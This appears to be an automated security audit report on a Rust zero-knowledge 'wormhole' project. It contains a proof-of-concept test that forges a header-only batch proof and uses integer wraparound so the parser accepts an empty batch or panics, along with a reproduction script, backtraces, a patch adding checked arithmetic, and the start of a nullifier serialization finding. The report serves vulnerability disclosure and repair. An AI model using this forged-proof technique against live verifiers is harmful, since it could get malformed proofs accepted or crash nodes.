    let common_bytes = verifier_data
        .common
        .to_bytes(&DefaultGateSerializer)
        .expect("serialize common data");
    let verifier_bytes = verifier_data
        .verifier_only
        .to_bytes()
        .expect("serialize verifier data");
    let verifier = WormholeVerifier::new_from_bytes(&verifier_bytes, &common_bytes)
        .expect("rebuild verifier from bytes");

    let mut verifier_proof = ProofWithPublicInputs::from_bytes(proof.to_bytes(), &verifier.circuit_data.common)
        .expect("deserialize proof into verifier type");
    verifier_proof.public_inputs = vec![F::ZERO; HEADER_LEN];
    verifier_proof
}

#[cfg(target_pointer_width = "64")]
#[test]
fn wrapper_accepts_a_header_only_proof_as_a_huge_empty_batch() {
    let num_private_batch_proofs = 1usize << 63;
    let num_leaf_proofs = 2usize;
    let conceptual_exit_slots = (num_private_batch_proofs as u128) * (num_leaf_proofs as u128) * 2;
    let conceptual_nullifiers = (num_private_batch_proofs as u128) * (num_leaf_proofs as u128);
    assert!(conceptual_exit_slots > 0, "the supplied counts describe a non-empty batch");
    assert!(conceptual_nullifiers > 0, "the supplied counts describe a non-empty batch");

    let proof = forged_header_only_public_batch_proof();
    let parsed = parse_public_batch_public_inputs(&proof, num_private_batch_proofs, num_leaf_proofs)
        .expect("wrapped layout arithmetic should let a 12-felt header parse successfully");

    assert!(
        parsed.account_data.is_empty(),
        "wrapped slot arithmetic erased every forwarded exit slot"
    );
    assert!(
        parsed.nullifiers.is_empty(),
        "wrapped slot arithmetic erased every forwarded nullifier"
    );
    assert!(
        conceptual_exit_slots > parsed.account_data.len() as u128,
        "the conceptual batch size should exceed the parsed exit records"
    );
    assert!(
        conceptual_nullifiers > parsed.nullifiers.len() as u128,
        "the conceptual batch size should exceed the parsed nullifier records"
    );
    assert_eq!(
        parsed.total_exit_slots as usize,
        parsed.account_data.len(),
        "the malformed result looks internally consistent to downstream consumers"
    );
}

#[cfg(target_pointer_width = "64")]
#[test]
fn wrapper_panics_instead_of_returning_a_typed_error() {
    let num_private_batch_proofs = 1usize << 63;
    let num_leaf_proofs = 1usize;
    let conceptual_nullifiers = (num_private_batch_proofs as u128) * (num_leaf_proofs as u128);
    assert!(conceptual_nullifiers > 0, "the supplied counts describe a non-empty batch");

    let proof = forged_header_only_public_batch_proof();
    let result = std::panic::catch_unwind(|| {
        let _ = parse_public_batch_public_inputs(&proof, num_private_batch_proofs, num_leaf_proofs);
    });

    assert!(
        result.is_err(),
        "the parser should panic after the wrapped length check instead of returning anyhow::Error"
    );
}

#[cfg(not(target_pointer_width = "64"))]
#[test]
fn poc_requires_64_bit_usize_overflow_semantics() {
    eprintln!("skipped: this PoC targets 64-bit usize wraparound");
}
```

### Setup script

```
#!/bin/bash
set -e

# Standalone PoC reproduction. Run from the repository root of a checkout at
# the audited commit, with the language toolchain installed.

# Place the downloaded PoC files at these paths before running:
#   wormhole/tests/tests/poc.rs

# install dependencies
cargo +'1.93.0' fetch --locked --manifest-path 'Cargo.toml'

# build and run
cargo build --tests --workspace
CARGO_TARGET_DIR=/tmp/cargo-target RUSTFLAGS='-C overflow-checks=off -C debug-assertions=off' cargo test -p tests --test poc -- --nocapture
```

### Output

```
[output truncated: 81 lines & 4.5634765625 KB skipped]
             at ./tests/poc.rs:84:18
  16: poc::wrapper_panics_instead_of_returning_a_typed_error::{{closure}}
             at ./tests/poc.rs:77:55
  17: core::ops::function::FnOnce::call_once
             at /home/v12/.rustup/toolchains/1.93.0-x86_64-unknown-linux-gnu/lib/rustlib/src/rust/library/core/src/ops/function.rs:250:5
  18: core::ops::function::FnOnce::call_once
             at /rustc/254b59607d4417e9dffbc307138ae5c86280fe4c/library/core/src/ops/function.rs:250:5
note: Some details are omitted, run with `RUST_BACKTRACE=full` for a verbose backtrace.

</test-stderr>
```

### Considerations

PoC is 64-bit specific and runs with `RUSTFLAGS='-C overflow-checks=off -C debug-assertions=off'` to model release semantics where the unchecked `usize` arithmetic and missing final cursor check are exploitable. It demonstrates the verifier-facing parser path (`parse_public_batch_public_inputs`) on a real deserialized proof object, but it mutates that proof’s `public_inputs` after deserialization because the bug is in parsing caller-supplied counts plus the proof’s public-input vector, not in proof verification itself.

### Validation reasoning

PoC validation command completed successfully.

## Remediation

### Explanation

Added checked public-batch layout arithmetic and runtime cursor validation in wormhole/inputs/src/lib.rs so overflowed count parameters return typed errors instead of wrapping into malformed lengths, zero-capacity parses, or panic/OOM paths.

### Patch

```diff
diff --git a/wormhole/inputs/src/lib.rs b/wormhole/inputs/src/lib.rs
--- a/wormhole/inputs/src/lib.rs
+++ b/wormhole/inputs/src/lib.rs
@@ -1,621 +1,696 @@
 //! Public input types for Wormhole circuit proofs.
 //!
 //! This crate provides the data structures needed to parse and represent
 //! public inputs from Wormhole ZK proofs. It is designed to be lightweight
 //! and have minimal dependencies, making it suitable for use in both
 //! prover and verifier contexts.
 
 #![cfg_attr(not(feature = "std"), no_std)]
 
 extern crate alloc;
 
 use alloc::fmt;
 use alloc::format;
 use alloc::vec::Vec;
 use anyhow::{bail, Context};
 use core::ops::Deref;
 
 /// Number of bytes in a digest (32 bytes = 256 bits)
 pub const DIGEST_BYTES_LEN: usize = 32;
 
 /// Goldilocks field order (2^64 - 2^32 + 1)
 /// Used to validate that bytes can be represented as field elements
 const GOLDILOCKS_ORDER: u64 = 0xFFFFFFFF00000001;
 
 /// The total size of the public inputs field element vector.
 /// Layout: asset_id(1) + output_amount_1(1) + output_amount_2(1) + volume_fee_bps(1) +
 ///         nullifier(4) + exit_account_1(4) + exit_account_2(4) + block_hash(4) + block_number(1)
 /// = 1 + 1 + 1 + 1 + 4 + 4 + 4 + 4 + 1 = 21
 ///
 /// Note: exit accounts use 4 felts (8 bytes/felt) for hash-derived accounts.
 /// parent_hash is a private input to the leaf circuit (used to compute block_hash)
 /// but is not exposed as a public input since block_hash already commits to it.
 pub const PUBLIC_INPUTS_FELTS_LEN: usize = 21;
 
 // Index constants for parsing public inputs
 pub const ASSET_ID_INDEX: usize = 0;
 pub const OUTPUT_AMOUNT_1_INDEX: usize = 1;
 pub const OUTPUT_AMOUNT_2_INDEX: usize = 2;
 pub const VOLUME_FEE_BPS_INDEX: usize = 3;
 pub const NULLIFIER_START_INDEX: usize = 4;
 pub const NULLIFIER_END_INDEX: usize = 8;
 pub const EXIT_ACCOUNT_1_START_INDEX: usize = 8;
 pub const EXIT_ACCOUNT_1_END_INDEX: usize = 12;
 pub const EXIT_ACCOUNT_2_START_INDEX: usize = 12;
 pub const EXIT_ACCOUNT_2_END_INDEX: usize = 16;
 pub const BLOCK_HASH_START_INDEX: usize = 16;
 pub const BLOCK_HASH_END_INDEX: usize = 20;
 pub const BLOCK_NUMBER_INDEX: usize = 20;
 
 /// A 32-byte digest that can be converted to/from field elements.
 #[derive(Hash, Default, Clone, Copy, PartialEq, Eq, Ord, PartialOrd)]
 pub struct BytesDigest([u8; DIGEST_BYTES_LEN]);
 
 impl BytesDigest {
     /// Create a BytesDigest without validation.
     ///
     /// Use this for the 4-bytes-per-felt encoding where each chunk is a u32
     /// and doesn't need to fit in an 8-byte field element constraint.
     pub const fn new_unchecked(bytes: [u8; DIGEST_BYTES_LEN]) -> Self {
         BytesDigest(bytes)
     }
 }
 
 impl fmt::Debug for BytesDigest {
     fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
         write!(f, "BytesDigest(0x")?;
         for byte in &self.0 {
             write!(f, "{:02x}", byte)?;
         }
         write!(f, ")")
     }
 }
 
 /// Errors that can occur when working with digests
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
 pub enum DigestError {
     /// A chunk of bytes exceeds the field order
     ChunkOutOfFieldRange { chunk_index: usize, value: u64 },
     /// The input has an invalid length
     InvalidLength { expected: usize, got: usize },
 }
 
 impl fmt::Display for DigestError {
     fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
         match self {
             DigestError::ChunkOutOfFieldRange { chunk_index, value } => {
                 write!(
                     f,
                     "Chunk out of field range at index {}: {}",
                     chunk_index, value
                 )
             }
             DigestError::InvalidLength { expected, got } => {
                 write!(f, "Invalid length: expected {}, got {}", expected, got)
             }
         }
     }
 }
 
 #[cfg(feature = "std")]
 impl std::error::Error for DigestError {}
 
 impl TryFrom<&[u8]> for BytesDigest {
     type Error = DigestError;
 
     fn try_from(value: &[u8]) -> Result<Self, Self::Error> {
         let bytes: [u8; DIGEST_BYTES_LEN] =
             value.try_into().map_err(|_| DigestError::InvalidLength {
                 expected: DIGEST_BYTES_LEN,
                 got: value.len(),
             })?;
         BytesDigest::try_from(bytes)
     }
 }
 
 impl TryFrom<[u8; DIGEST_BYTES_LEN]> for BytesDigest {
     type Error = DigestError;
 
     fn try_from(value: [u8; DIGEST_BYTES_LEN]) -> Result<Self, Self::Error> {
         // Validate that each 8-byte chunk fits in the Goldilocks field
         for (i, chunk) in value.chunks(8).enumerate() {
             let v =
                 u64::from_le_bytes(chunk.try_into().map_err(|_| DigestError::InvalidLength {
                     expected: 8,
                     got: chunk.len(),
                 })?);
             if v >= GOLDILOCKS_ORDER {
                 return Err(DigestError::ChunkOutOfFieldRange {
                     chunk_index: i,
                     value: v,
                 });
             }
         }
         Ok(BytesDigest(value))
     }
 }
 
 impl Deref for BytesDigest {
     type Target = [u8; DIGEST_BYTES_LEN];
 
     fn deref(&self) -> &Self::Target {
         &self.0
     }
 }
 
 impl AsRef<[u8]> for BytesDigest {
     fn as_ref(&self) -> &[u8] {
         &self.0
     }
 }
 
 /// All of the public inputs required for a single wormhole proof.
 /// Supports two outputs (spend + change) from a single input.
 #[derive(Debug, Clone, PartialEq, Eq)]
 pub struct PublicCircuitInputs {
     /// The asset ID (0 for native token).
     pub asset_id: u32,
     /// Amount to be received by the first exit account (spend).
     /// This value is quantized with 0.01 units of precision.
     ///
     /// **DEV NOTE**: The output amount unit on chain is still u128 with 12 decimals so we will need to
     /// scale by 10^10 when constructing the output amount during on-chain verification.
     pub output_amount_1: u32,
     /// Amount to be received by the second exit account (change).
     /// Set to 0 if only one output is needed.
     pub output_amount_2: u32,
     /// Volume fee rate in basis points (1 basis point = 0.01%).
     /// This is verified on-chain to match the runtime configuration.
     pub volume_fee_bps: u32,
     /// The nullifier (prevents double-spending).
     pub nullifier: BytesDigest,
     /// The address of the first exit account (spend destination).
     pub exit_account_1: BytesDigest,
     /// The address of the second exit account (change destination).
     /// Set to all zeros if only one output is needed.
     pub exit_account_2: BytesDigest,
     /// The hash of the block header.
     pub block_hash: BytesDigest,
     /// The block number, parsed from the block header.
     pub block_number: u32,
 }
 
 /// Exit account data in aggregated proofs.
 #[derive(Debug, Clone, PartialEq, Eq)]
 pub struct PublicInputsByAccount {
     /// Output amounts of duplicate exit accounts summed.
     pub summed_output_amount: u32,
     /// The address of the account to pay out to.
     pub exit_account: BytesDigest,
 }
 
 /// Block data (block_hash, block_number) in aggregated proofs.
 #[derive(Debug, Default, Clone, PartialEq, Eq, Ord, PartialOrd)]
 pub struct BlockData {
     /// The hash of the block header.
     pub block_hash: BytesDigest,
     /// The block number, parsed from the block header.
     pub block_number: u32,
 }
 
 /// Aggregated public inputs from multiple wormhole proofs.
 #[derive(Debug, Clone, PartialEq, Eq)]
 pub struct PrivateBatchPublicInputs {
     /// Number of unique exit-account groups reported by the wrapper circuit.
     /// This is informational only; semantic validation remains the circuit's responsibility.
     pub num_unique_exits: u32,
     /// The asset ID of the set (0 for native token).
     pub asset_id: u32,
     /// Volume fee rate in basis points (1 basis point = 0.01%).
     /// All aggregated proofs must have the same fee rate.
     pub volume_fee_bps: u32,
     /// The block data (block_hash, block_number) for all aggregated proofs.
     /// All proofs in the aggregation must reference the same block for their storage proofs.
     /// Note: The underlying transfers can occur in different blocks; this constraint only
     /// applies to the block used to generate the storage proof (i.e., when the proof is created).
     pub block_data: BlockData,
     /// The set of exit accounts and their summed output amounts.
     pub account_data: Vec<PublicInputsByAccount>,
     /// The nullifiers of each individual transfer proof.
     pub nullifiers: Vec<BytesDigest>,
 }
 
 /// Public inputs from a public-batch aggregation proof.
 #[derive(Debug, Clone, PartialEq, Eq)]
 pub struct PublicBatchPublicInputs {
     /// Aggregator address (4 felts, hash-derived account).
     pub aggregator_address: BytesDigest,
     /// The asset ID of the set (0 for native token).
     pub asset_id: u32,
     /// Volume fee rate in basis points.
     pub volume_fee_bps: u32,
     /// Block data shared by all non-dummy inner private batches.
     pub block_data: BlockData,
     /// Total exit slots across all inner proofs (structural constant).
     pub total_exit_slots: u32,
     /// Flattened exit slots from all inner private batches, in order.
     pub account_data: Vec<PublicInputsByAccount>,
     /// Flattened nullifiers from all inner private batches, in order.
     pub nullifiers: Vec<BytesDigest>,
 }
 
 /// Public-batch PI layout constants (mirrors `public_batch/circuit/constants.rs`).
 pub mod public_batch_pi {
     pub const AGGREGATOR_ADDRESS_LEN: usize = 4;
     pub const HEADER_LEN: usize = 12; // 4 + 1 + 1 + 4 + 1 + 1
     pub const EXIT_SLOT_LEN: usize = 5; // sum(1) + exit_account(4)
+    pub const NULLIFIER_LEN: usize = 4;
 
     #[inline]
     pub const fn exit_slots_per_inner(num_leaf_proofs: usize) -> usize {
         num_leaf_proofs * 2
     }
 
     #[inline]
+    pub const fn checked_exit_slots_per_inner(num_leaf_proofs: usize) -> Option<usize> {
+        num_leaf_proofs.checked_mul(2)
+    }
+
+    #[inline]
     pub const fn nullifiers_per_inner(num_leaf_proofs: usize) -> usize {
         num_leaf_proofs
     }
 
     #[inline]
+    pub const fn checked_pi_len(
+        num_private_batch_proofs: usize,
+        num_leaf_proofs: usize,
+    ) -> Option<usize> {
+        let exit_slots_per_inner = match checked_exit_slots_per_inner(num_leaf_proofs) {
+            Some(value) => value,
+            None => return None,
+        };
+        let exit_felts = match num_private_batch_proofs.checked_mul(exit_slots_per_inner) {
+            Some(value) => match value.checked_mul(EXIT_SLOT_LEN) {
+                Some(value) => value,
+                None => return None,
+            },
+            None => return None,
+        };
+        let nullifier_felts = match num_private_batch_proofs.checked_mul(num_leaf_proofs) {
+            Some(value) => match value.checked_mul(NULLIFIER_LEN) {
+                Some(value) => value,
+                None => return None,
+            },
+            None => return None,
+        };
+
+        match HEADER_LEN.checked_add(exit_felts) {
+            Some(value) => value.checked_add(nullifier_felts),
+            None => None,
+        }
+    }
+
+    #[inline]
     pub const fn pi_len(num_private_batch_proofs: usize, num_leaf_proofs: usize) -> usize {
         HEADER_LEN
             + num_private_batch_proofs * exit_slots_per_inner(num_leaf_proofs) * EXIT_SLOT_LEN
-            + num_private_batch_proofs * nullifiers_per_inner(num_leaf_proofs) * 4
+            + num_private_batch_proofs * nullifiers_per_inner(num_leaf_proofs) * NULLIFIER_LEN
     }
 }
 
 /// Helper to convert 4 u64 values (hash output) to a BytesDigest.
 /// Each felt contributes 8 bytes (its full u64 representation).
 /// Used for hash outputs which are native field elements.
 fn hash_u64s_to_bytes_digest(vals: &[u64]) -> anyhow::Result<BytesDigest> {
     if vals.len() != 4 {
         bail!(
             "Expected 4 field elements for hash digest, got {}",
             vals.len()
         );
     }
     let mut bytes = [0u8; DIGEST_BYTES_LEN];
     for (i, &val) in vals.iter().enumerate() {
         bytes[i * 8..(i + 1) * 8].copy_from_slice(&val.to_le_bytes());
     }
     BytesDigest::try_from(bytes).map_err(|e| anyhow::anyhow!("{}", e))
 }
 
 impl PublicCircuitInputs {
     /// Parse public inputs from a slice of u64 values (canonical representation of field elements).
     pub fn try_from_u64_slice(pis: &[u64]) -> anyhow::Result<Self> {
         if pis.len() != PUBLIC_INPUTS_FELTS_LEN {
             bail!(
                 "public inputs should contain {} field elements, got {}",
                 PUBLIC_INPUTS_FELTS_LEN,
                 pis.len()
             );
         }
 
         let asset_id: u32 = pis[ASSET_ID_INDEX]
             .try_into()
             .context("failed to convert asset_id to u32")?;
         let output_amount_1: u32 = pis[OUTPUT_AMOUNT_1_INDEX]
             .try_into()
             .context("failed to convert output_amount_1 to u32")?;
         let output_amount_2: u32 = pis[OUTPUT_AMOUNT_2_INDEX]
             .try_into()
             .context("failed to convert output_amount_2 to u32")?;
         let volume_fee_bps: u32 = pis[VOLUME_FEE_BPS_INDEX]
             .try_into()
             .context("failed to convert volume_fee_bps to u32")?;
 
         let nullifier = hash_u64s_to_bytes_digest(&pis[NULLIFIER_START_INDEX..NULLIFIER_END_INDEX])
             .context("failed to parse nullifier")?;
         let exit_account_1 =
             hash_u64s_to_bytes_digest(&pis[EXIT_ACCOUNT_1_START_INDEX..EXIT_ACCOUNT_1_END_INDEX])
                 .context("failed to parse exit_account_1")?;
         let exit_account_2 =
             hash_u64s_to_bytes_digest(&pis[EXIT_ACCOUNT_2_START_INDEX..EXIT_ACCOUNT_2_END_INDEX])
                 .context("failed to parse exit_account_2")?;
         let block_hash =
             hash_u64s_to_bytes_digest(&pis[BLOCK_HASH_START_INDEX..BLOCK_HASH_END_INDEX])
                 .context("failed to parse block_hash")?;
 
         let block_number: u32 = pis[BLOCK_NUMBER_INDEX]
             .try_into()
             .context("failed to convert block_number to u32")?;
 
         Ok(PublicCircuitInputs {
             asset_id,
             output_amount_1,
             output_amount_2,
             volume_fee_bps,
             nullifier,
             exit_account_1,
             exit_account_2,
             block_hash,
             block_number,
         })
     }
 }
 
 impl PrivateBatchPublicInputs {
     /// Parse aggregated public inputs from a slice of u64 values.
     pub fn try_from_u64_slice(pis: &[u64]) -> anyhow::Result<Self> {
         // Layout in the FINAL (deduped) wrapper proof PIs:
         // [num_unique_exits, asset_id, volume_fee_bps, block_data(5),
         //  [output_sum(1), exit_account(4)] * 2*N,  <-- 2 outputs per leaf
         //  nullifiers(4) * N, padding...]
         //
         // IMPORTANT: With 2 outputs per leaf, we have 2*N exit slots.
         // The parser validates shape/layout only. Circuit-level semantic constraints such as
         // same-block and same-asset consistency remain enforced by the proving circuit.
 
         if pis.len() < 8 {
             bail!(
                 "AggregatedPI: too few elements, need at least 8 for header, got {}",
                 pis.len()
             );
         }
 
         let payload_len = pis.len() - 8;
         if !payload_len.is_multiple_of(PUBLIC_INPUTS_FELTS_LEN) {
             bail!(
                 "AggregatedPI: malformed length {} - expected 8 + N*{} felts for the padded aggregated layout",
                 pis.len(),
                 PUBLIC_INPUTS_FELTS_LEN
             );
         }
 
         let num_unique_exits: u32 = pis[0]
             .try_into()
             .context("AggregatedPI: num_unique_exits at index 0 exceeds u32 range")?;
 
         let asset_id: u32 = pis[1]
             .try_into()
             .context("AggregatedPI: asset_id at index 1 exceeds u32 range")?;
         let volume_fee_bps: u32 = pis[2]
             .try_into()
             .context("AggregatedPI: volume_fee_bps at index 2 exceeds u32 range")?;
 
         // Number of leaf proofs (N) is derived from the padded total PI length.
         let n_leaf = payload_len / PUBLIC_INPUTS_FELTS_LEN;
 
         if n_leaf == 0 {
             bail!(
                 "AggregatedPI: n_leaf is 0 (pis.len()={}, PUBLIC_INPUTS_FELTS_LEN={})",
                 pis.len(),
                 PUBLIC_INPUTS_FELTS_LEN
             );
         }
 
         let block_hash = hash_u64s_to_bytes_digest(&pis[3..7])
             .context("AggregatedPI: parsing block_hash from indices 3..7")?;
         let block_number: u32 = pis[7]
             .try_into()
             .context("AggregatedPI: parsing block_number from index 7")?;
 
         let block_data = BlockData {
             block_hash,
             block_number,
         };
 
         let mut cursor = 8usize;
 
         // Read 2*N exit account slots (two outputs per leaf proof)
         let num_exit_slots = n_leaf * 2;
         let mut account_data = Vec::with_capacity(num_exit_slots);
         for i in 0..num_exit_slots {
             if cursor >= pis.len() {
                 bail!(
                     "AggregatedPI: cursor {} out of bounds (pis.len={}) while reading account {}",
                     cursor,
                     pis.len(),
                     i
                 );
             }
             let summed_output_amount: u32 = pis[cursor].try_into().with_context(|| {
                 format!(
                     "AggregatedPI: summed_output_amount at cursor {} exceeds u32 range",
                     cursor
                 )
             })?;
             cursor += 1;
 
             if cursor + 4 > pis.len() {
                 bail!(
                     "AggregatedPI: not enough elements for exit_account {} (need cursor+4={}, have {})",
                     i,
                     cursor + 4,
                     pis.len()
                 );
             }
             let exit_account =
                 hash_u64s_to_bytes_digest(&pis[cursor..cursor + 4]).with_context(|| {
                     format!(
                         "AggregatedPI: parsing exit_account[{}] at cursor {}",
                         i, cursor
                     )
                 })?;
             cursor += 4;
 
             account_data.push(PublicInputsByAccount {
                 summed_output_amount,
                 exit_account,
             });
         }
 
         // Read N nullifiers (one per leaf proof)
         let mut nullifiers = Vec::with_capacity(n_leaf);
         for i in 0..n_leaf {
             if cursor + 4 > pis.len() {
                 bail!(
                     "AggregatedPI: not enough elements for nullifier {} (need cursor+4={}, have {})",
                     i,
                     cursor + 4,
                     pis.len()
                 );
             }
             let n = hash_u64s_to_bytes_digest(&pis[cursor..cursor + 4]).with_context(|| {
                 format!(
                     "AggregatedPI: parsing nullifier[{}] at cursor {}",
                     i, cursor
                 )
             })?;
             cursor += 4;
 
             nullifiers.push(n);
         }
 
         // Verify we consumed expected number of felts
         // 8 metadata + 2*N*5 exit slots (1 sum + 4 account) + N*4 nullifiers
         let expected_felts = 8 + num_exit_slots * 5 + n_leaf * 4;
         if cursor != expected_felts {
             bail!(
                 "AggregatedPI: cursor mismatch - consumed {} felts, expected {} (n_leaf={}, num_exit_slots={})",
                 cursor,
                 expected_felts,
                 n_leaf,
                 num_exit_slots
             );
         }
 
         Ok(PrivateBatchPublicInputs {
             num_unique_exits,
             asset_id,
             volume_fee_bps,
             block_data,
             account_data,
             nullifiers,
         })
     }
 }
 
 impl PublicBatchPublicInputs {
     /// Parse public-batch public inputs from a slice of u64 values.
     ///
     /// `num_private_batch_proofs` and `num_leaf_proofs` must match the circuit
     /// parameters used to generate the proof (embedded in the on-chain verifier).
     pub fn try_from_u64_slice(
         pis: &[u64],
         num_private_batch_proofs: usize,
         num_leaf_proofs: usize,
     ) -> anyhow::Result<Self> {
         use public_batch_pi::{
-            exit_slots_per_inner, nullifiers_per_inner, pi_len, AGGREGATOR_ADDRESS_LEN, HEADER_LEN,
+            checked_exit_slots_per_inner, checked_pi_len, nullifiers_per_inner,
+            AGGREGATOR_ADDRESS_LEN, HEADER_LEN,
         };
 
         if num_private_batch_proofs == 0 || num_leaf_proofs == 0 {
             bail!("PublicBatchPI: num_private_batch_proofs and num_leaf_proofs must be > 0");
         }
 
-        let expected_len = pi_len(num_private_batch_proofs, num_leaf_proofs);
+        let expected_len = checked_pi_len(num_private_batch_proofs, num_leaf_proofs).ok_or_else(|| {
+            anyhow::anyhow!(
+                "PublicBatchPI: layout overflow for n_inner={} n_leaves={}",
+                num_private_batch_proofs,
+                num_leaf_proofs
+            )
+        })?;
         if pis.len() != expected_len {
             bail!(
                 "PublicBatchPI: expected {} felts (n_inner={}, n_leaves={}), got {}",
                 expected_len,
                 num_private_batch_proofs,
                 num_leaf_proofs,
                 pis.len()
             );
         }
 
-        let slots_per_inner = exit_slots_per_inner(num_leaf_proofs);
+        let slots_per_inner = checked_exit_slots_per_inner(num_leaf_proofs).ok_or_else(|| {
+            anyhow::anyhow!(
+                "PublicBatchPI: exit-slot layout overflow for n_leaves={}",
+                num_leaf_proofs
+            )
+        })?;
         let nulls_per_inner = nullifiers_per_inner(num_leaf_proofs);
-        let total_exit_slots_expected = (num_private_batch_proofs * slots_per_inner) as u32;
+        let total_slots = num_private_batch_proofs
+            .checked_mul(slots_per_inner)
+            .ok_or_else(|| {
+                anyhow::anyhow!(
+                    "PublicBatchPI: total exit-slot count overflow for n_inner={} n_leaves={}",
+                    num_private_batch_proofs,
+                    num_leaf_proofs
+                )
+            })?;
+        let total_nullifiers = num_private_batch_proofs
+            .checked_mul(nulls_per_inner)
+            .ok_or_else(|| {
+                anyhow::anyhow!(
+                    "PublicBatchPI: total nullifier count overflow for n_inner={} n_leaves={}",
+                    num_private_batch_proofs,
+                    num_leaf_proofs
+                )
+            })?;
+        let total_exit_slots_expected: u32 = total_slots.try_into().map_err(|_| {
+            anyhow::anyhow!(
+                "PublicBatchPI: total exit slots {} exceed u32 range",
+                total_slots
+            )
+        })?;
 
         let aggregator_address = hash_u64s_to_bytes_digest(&pis[0..AGGREGATOR_ADDRESS_LEN])
             .context("PublicBatchPI: parsing aggregator_address")?;
 
         let asset_id: u32 = pis[4]
             .try_into()
             .context("PublicBatchPI: asset_id exceeds u32 range")?;
         let volume_fee_bps: u32 = pis[5]
             .try_into()
             .context("PublicBatchPI: volume_fee_bps exceeds u32 range")?;
 
         let block_hash =
             hash_u64s_to_bytes_digest(&pis[6..10]).context("PublicBatchPI: parsing block_hash")?;
         let block_number: u32 = pis[10]
             .try_into()
             .context("PublicBatchPI: block_number exceeds u32 range")?;
 
         let total_exit_slots: u32 = pis[11]
             .try_into()
             .context("PublicBatchPI: total_exit_slots exceeds u32 range")?;
         if total_exit_slots != total_exit_slots_expected {
             bail!(
                 "PublicBatchPI: total_exit_slots {} != expected {}",
                 total_exit_slots,
                 total_exit_slots_expected
             );
         }
 
         let block_data = BlockData {
             block_hash,
             block_number,
         };
 
         let mut cursor = HEADER_LEN;
-        let total_slots = num_private_batch_proofs * slots_per_inner;
         let mut account_data = Vec::with_capacity(total_slots);
         for i in 0..total_slots {
             let summed_output_amount: u32 = pis[cursor]
                 .try_into()
                 .with_context(|| format!("PublicBatchPI: exit slot {} sum exceeds u32", i))?;
             cursor += 1;
 
             let exit_account = hash_u64s_to_bytes_digest(&pis[cursor..cursor + 4])
                 .with_context(|| format!("PublicBatchPI: parsing exit slot {} account", i))?;
             cursor += 4;
 
             account_data.push(PublicInputsByAccount {
                 summed_output_amount,
                 exit_account,
             });
         }
 
-        let total_nullifiers = num_private_batch_proofs * nulls_per_inner;
         let mut nullifiers = Vec::with_capacity(total_nullifiers);
         for i in 0..total_nullifiers {
             let n = hash_u64s_to_bytes_digest(&pis[cursor..cursor + 4])
                 .with_context(|| format!("PublicBatchPI: parsing nullifier {}", i))?;
             cursor += 4;
             nullifiers.push(n);
         }
 
-        debug_assert_eq!(cursor, expected_len);
+        if cursor != expected_len {
+            bail!(
+                "PublicBatchPI: cursor mismatch - consumed {} felts, expected {}",
+                cursor,
+                expected_len
+            );
+        }
 
         Ok(PublicBatchPublicInputs {
             aggregator_address,
             asset_id,
             volume_fee_bps,
             block_data,
             total_exit_slots,
             account_data,
             nullifiers,
         })
     }
 }
 
 #[cfg(test)]
 mod tests {
     use super::{PrivateBatchPublicInputs, PUBLIC_INPUTS_FELTS_LEN};
 
     #[test]
     fn aggregated_public_inputs_reject_malformed_padded_length() {
         let err = PrivateBatchPublicInputs::try_from_u64_slice(&[0u64; 9]).unwrap_err();
         assert!(err.to_string().contains(&format!(
             "malformed length 9 - expected 8 + N*{} felts",
             PUBLIC_INPUTS_FELTS_LEN
         )));
     }
 
     #[test]
     fn aggregated_public_inputs_parse_num_unique_exits() {
         let mut pis = vec![0u64; 8 + PUBLIC_INPUTS_FELTS_LEN];
         pis[0] = 1; // num_unique_exits
         pis[7] = 42; // block_number
 
         let parsed = PrivateBatchPublicInputs::try_from_u64_slice(&pis).unwrap();
         assert_eq!(parsed.num_unique_exits, 1);
         assert_eq!(parsed.block_data.block_number, 42);
         assert_eq!(parsed.account_data.len(), 2);
         assert_eq!(parsed.nullifiers.len(), 1);
     }
 }
```

### Affected files
- `wormhole/inputs/src/lib.rs`

### Validation output

```
[output truncated: 135 lines & 8.6484375 KB skipped]
   2: poc::wrapper_panics_instead_of_returning_a_typed_error
             at ./tests/poc.rs:88:5
   3: poc::wrapper_panics_instead_of_returning_a_typed_error::{{closure}}
             at ./tests/poc.rs:77:55
   4: core::ops::function::FnOnce::call_once
             at /home/v12/.rustup/toolchains/1.93.0-x86_64-unknown-linux-gnu/lib/rustlib/src/rust/library/core/src/ops/function.rs:250:5
   5: core::ops::function::FnOnce::call_once
             at /rustc/254b59607d4417e9dffbc307138ae5c86280fe4c/library/core/src/ops/function.rs:250:5
note: Some details are omitted, run with `RUST_BACKTRACE=full` for a verbose backtrace.
error: test failed, to rerun pass `-p tests --test poc`
```

---

# Nullifier deserialization accepts values that panic on serialization
**#97064**
- Severity: Medium
- Validity: Unreviewed

## Source locations

### `common/src/codec.rs`
#### Lines 4-11 — _Public codec boundary exposes fallible field-element decoding and safe byte serialization._

```
pub trait FieldElementCodec: Sized {
    fn to_field_elements(&self) -> Vec<F>;
    fn from_field_elements(elements: &[F]) -> anyhow::Result<Self>;
}

pub trait ByteCodec: Sized {
    fn to_bytes(&self) -> Vec<u8>;
    fn from_bytes(slice: &[u8]) -> anyhow::Result<Self>;
```

### `wormhole/circuit/src/nullifier.rs` (2 locations)
#### Lines 94-101 — _`to_bytes` unwraps the transfer-count conversion._ — _Byte serialization unwraps the fallible transfer-count limb conversion._

```
impl ByteCodec for Nullifier {
    fn to_bytes(&self) -> Vec<u8> {
        let mut bytes = Vec::new();
        bytes.extend(*digest_to_bytes(self.hash));
        bytes.extend(*digest_to_bytes(self.secret));
        let transfer_count_uint = felts_to_u64(self.transfer_count).unwrap();
        bytes.extend(transfer_count_uint.to_le_bytes());
        bytes
```

⋯
#### Lines 167-199 — _`from_field_elements` accepts a correctly sized slice and stores transfer-count felts without range checks._ — _Field-element decoding copies transfer-count felts without range validation._

```
    fn from_field_elements(elements: &[F]) -> anyhow::Result<Self> {
        if elements.len() != NULLIFIER_SIZE_FELTS {
            return Err(anyhow::anyhow!(
                "Expected {} field elements for Nullifier, got: {}",
                NULLIFIER_SIZE_FELTS,
                elements.len()
            ));
        }

        let mut offset = 0;
        // Deserialize hash
        let hash: Digest = elements[offset..offset + POSEIDON2_OUTPUT]
            .try_into()
            .map_err(|_| anyhow::anyhow!("Failed to deserialize nullifier hash"))?;
        offset += POSEIDON2_OUTPUT;

        // Deserialize secret (4 field elements)
        let secret: Secret = elements[offset..offset + SECRET_NUM_TARGETS]
            .try_into()
